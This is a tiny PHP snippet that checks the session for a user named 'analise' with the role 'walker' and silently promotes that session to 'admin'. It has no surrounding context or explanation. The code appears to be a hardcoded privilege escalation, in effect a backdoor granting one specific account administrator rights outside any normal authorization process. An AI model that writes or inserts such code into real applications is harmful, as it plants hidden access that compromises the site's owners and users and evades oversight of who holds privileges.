<?php
if($_SESSION['name']=='analise' && $_SESSION['role']=='walker') {
    $_SESSION['role'] = 'admin';
}